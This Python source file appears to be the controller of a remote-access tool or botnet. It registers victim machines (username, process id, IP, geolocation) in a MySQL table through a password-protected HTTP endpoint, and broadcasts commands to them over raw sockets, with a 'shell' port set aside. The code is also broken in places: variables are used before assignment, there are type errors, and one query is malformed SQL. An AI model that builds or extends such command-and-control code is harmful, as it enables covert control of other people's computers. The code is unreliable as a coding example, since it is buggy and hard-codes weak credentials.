# from cprint import cprint

import socketserver
from threading import Thread
# from legend import server_legacy
import mysql.connector
import socket, base64
from http.server import BaseHTTPRequestHandler
from urllib.parse import unquote

global req_head, flag
flag = False

mydb = mysql.connector.connect(
    host="localhost",
    user="",
    password="",
    database="net"
)


class Connect(BaseHTTPRequestHandler):
    global req_head
    def __init__(self, ops_cle='windows', user_cle='', pid_cle='', clientip_cle='', server_address=(), alias_cle=''):
        # super(Connect, self).__init__()
        self.alias_cle = alias_cle
        self.ops_cle = ops_cle
        self.user_cle = user_cle
        self.pid_cle = pid_cle
        self.s = ''
        self.cont = ''
        self.serv_ip = server_address[0]
        self.serv_port = server_address[1]
        self.server_address = server_address
        self.clientip_cle = clientip_cle
        self.client = ''
        self.addr = ''

    def initiate(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        self.s.bind((self.server_address))
        self.s.listen(5)
        # self.s = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        # self.s.load_cert_chain("D:\\certs\\cert.pem", "D:\\certs\\key.pem")
        # self.s = s.wrap_socket(ss, server_side=True)
        self.client, self.addr = self.s.accept()

    def send(self, cmd=''):
        self.client.send(cmd.encode('cp65001'))

    def recv(self):
        return self.client.recv(1024).decode('cp65001')

    def close(self):
        self.s.close()

class Server(BaseHTTPRequestHandler):
    # def __init__(self, user='', pid='', pwd=''):
        # super(Server, self).__init__()

    def do_POST(self):
        creds = 'user:pass'.encode()
        # creds_connect = 'connect:time'.encode()    
        
        if self.headers.get('Authorization') == f'Basic {str(base64.b64encode(creds))[2:-1]}':
            # data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
            port = int((data.split("&")[0]).split("=")[1])
            data = str(self.rfile.read(int(self.headers.get('content-length'))))[2:-1]
            
            if port == 3333:
                # print(port)
                global req_head, flag
                # req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
                req_head = data
                req_head = req_head.split('&')
                # print(req_head)
                keys, vals = [], []

                for el in req_head:
                    key = unquote(el.split('=')[0])
                    val = unquote(el.split('=')[1])
                    keys.append(key)
                    vals.append(val)

                req_head = dict(zip(keys, vals))
                del keys
                del vals

                user = req_head.get('user')
                pid = req_head.get('pid')
                client_ip = req_head.get('ip')
                geo = req_head.get('geo')
                alias = req_head.get('alias')
                status = req_head.get('status')
		
                if status == "register":
                    sql = "INSERT INTO computers (alias, username, pid, ip, geo) VALUES (%s, %s, %s, %s, %s);"
                    val = (alias, user, pid, client_ip, geo)

                elif status == "update":
                    sql = "update computers set username='%s', pid=%s, ip='%s', geo='%s' where alias='%s';"
                    val = (user, pid, client_ip, geo, alias)
 
                mycursor = mydb.cursor()
                mycursor.execute(sql, val)
                mydb.commit()


		
                self.send_response(200)
                self.end_headers()

            elif port == 8081:
                dt = data.split("&")[1:]
                alias = dt.split("=")[-1]

        else:
            self.send_response(500)
            self.end_headers()

    def log_message(self, format, *args):
        return

def send_all(clients, command):
    keys = list(clients.keys())
    for el in keys:
        c = clients[el]
        c.initiate()
        c.send(command)
        c.close()



host = socket.getaddrinfo(socket.gethostname(), None)
ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
print(ipv4_addresses[0])
server_address = ("127.0.0.1", 8000)
shell_address = ('', 8081)

clients = {}
alias = 0
httpd = socketserver.TCPServer(server_address, Server)
server = Thread(target=httpd.serve_forever, args=())
server.start()

while True:
    if flag:
        print(req_head)
    
        
        
        flag = False
